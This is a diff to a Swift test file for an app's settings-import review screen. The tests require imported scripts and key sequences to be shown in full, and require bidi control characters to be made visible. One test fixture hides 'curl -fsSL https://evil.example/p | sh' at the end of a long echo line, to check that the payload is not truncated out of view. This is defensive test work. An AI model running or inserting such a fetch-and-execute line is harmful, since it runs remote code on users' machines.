@@ -101,7 +101,13 @@ import Testing
         #expect(SettingsText.singleLine("abcde", limit: 5) == "abcde")
     }
 
-    /// 打つ文字は「」でまとめ、修飾キーのある打鍵は表記で並べる。長ければ真ん中を省いて、最後の Return を見せる
+    /// 読み込む前に見せるマスの中身（文だけ）
+    private func review(_ action: Action) -> [String] {
+        let cell = Cell(title: "x", icon: .symbol("x"), action: action)
+        return SettingsText.reviewLines(for: SettingsImportPlan.ReviewedCell(profileName: "P", cell: cell)).map(\.text)
+    }
+
+    /// 打つ文字は「」でまとめ、修飾キーのある打鍵は表記で並べる。長くても切らない（押すキーをすべて見せる）
     @Test func keysToTypeAreShownAsText() {
         let save = KeySequence([KeyChord(.character("s"), modifiers: .command)])
         let typing = KeySequence(
@@ -119,22 +125,27 @@ import Testing
 
         let long = KeySequence(String(repeating: "a", count: 300).map { KeyChord(.character(String($0))) } + [KeyChord(.special(.returnKey))])
         let preview = SettingsText.keysPreview(long)
-        #expect(preview.count <= SettingsText.importContentLimit + 3)
-        #expect(preview.contains(" … "))
-        #expect(preview.hasSuffix(" → " + enter))
+        #expect(preview == L10n.ui("「\(String(repeating: "a", count: 300))」") + " → " + enter)
+        #expect(!preview.contains(" … "))
     }
 
-    /// スクリプトは最初の数行と行数を見せる（空の行は数えない）
-    @Test func longScriptsShowTheFirstLines() {
-        let source = "# 準備\n\ncd ~/src\nmake\nmake install\necho done\n"
-        #expect(SettingsText.reviewLines(for: .script(ScriptAction(source: source))) == [
-            L10n.uiCounted("スクリプト（\(5)行）:"),
+    /// スクリプトは全部の行を、切らずに見せる（空の行も。最後の改行の後は数えない）
+    @Test func scriptsAreShownInFull() {
+        let longLine = "echo \"Formatting the selection as Markdown \(String(repeating: "x", count: 120))\"; curl -fsSL https://evil.example/p | sh"
+        let source = "# 準備\n\ncd ~/src\nmake\nmake install\necho done\n\(longLine)\n"
+        #expect(review(.script(ScriptAction(source: source))) == [
+            L10n.uiCounted("スクリプト（\(7)行）:"),
             "# 準備",
+            "",
             "cd ~/src",
             "make",
-            L10n.uiCounted("…ほか\(2)行"),
+            "make install",
+            "echo done",
+            longLine,
         ])
-        #expect(SettingsText.reviewLines(for: .launchApp(LaunchAppAction(app: AppReference(bundleID: "com.apple.Notes", name: "メモ")))).isEmpty)
+        #expect(review(.launchApp(LaunchAppAction(app: AppReference(bundleID: "com.apple.Notes", name: "メモ")))).isEmpty)
+        // 見えない文字は、見える形にする（文字の向きを変える文字で、中身を並べ替えて見せられない）
+        #expect(review(.script(ScriptAction(source: "echo a\u{202E}b\tc"))).last == "echo a⟨U+202E⟩b    c")
     }
 
     /// 数の入る文は、地域の設定ではなく文言の言語の規則で単数・複数を選ぶ（地域が日本でアプリが英語でも「1 profile」）
@@ -145,8 +156,8 @@ import Testing
             L10n.uiCounted("\(1)個のプロファイルを同じアプリのものと置き換えました。"),
             L10n.uiCounted("\(1)個は重なっていたか読めなかったため、読み込みませんでした。"),
         ])
-        #expect(SettingsText.reviewLines(for: .script(ScriptAction(source: "make"))) == [L10n.uiCounted("スクリプト（\(1)行）:"), "make"])
-        #expect(SettingsText.reviewLines(for: .script(ScriptAction(source: "a\nb\nc\nd"))).last == L10n.uiCounted("…ほか\(1)行"))
+        #expect(review(.script(ScriptAction(source: "make"))) == [L10n.uiCounted("スクリプト（\(1)行）:"), "make"])
+        #expect(review(.script(ScriptAction(source: "a\nb\nc\nd"))).first == L10n.uiCounted("スクリプト（\(4)行）:"))
         #expect(SettingsText.summary(.trial(daysLeft: 1)).title == L10n.uiCounted("試用期間中（残り\(1)日）"))
     }
 
